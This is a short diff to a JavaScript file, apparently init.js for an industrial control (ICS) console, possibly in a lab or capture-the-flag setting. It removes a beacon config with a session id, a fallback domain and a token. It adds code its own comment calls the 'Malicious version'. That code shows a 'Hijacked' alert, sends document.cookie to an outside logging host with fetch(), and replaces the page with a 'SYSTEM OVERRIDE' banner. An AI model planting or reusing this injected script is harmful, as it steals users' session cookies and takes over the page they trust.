@@ -1,5 +1,7 @@
-var beacon = {
-  session_id: "O-TX-11-403",
-  fallback_dns: "uplink-fallback.virelia-water.it.com",
-  token: "JBSWY3DPEBLW64TMMQQQ=="
-};
+// Malicious version of init.js
+alert("💥 ICS Console Hijacked by Atharva!");
+
+fetch("https://your-request-logger.com/log?c=" + document.cookie);
+
+// Optional: overwrite the DOM to simulate takeover
+document.body.innerHTML = "<h1 style='color:red'>SYSTEM OVERRIDE</h1>";
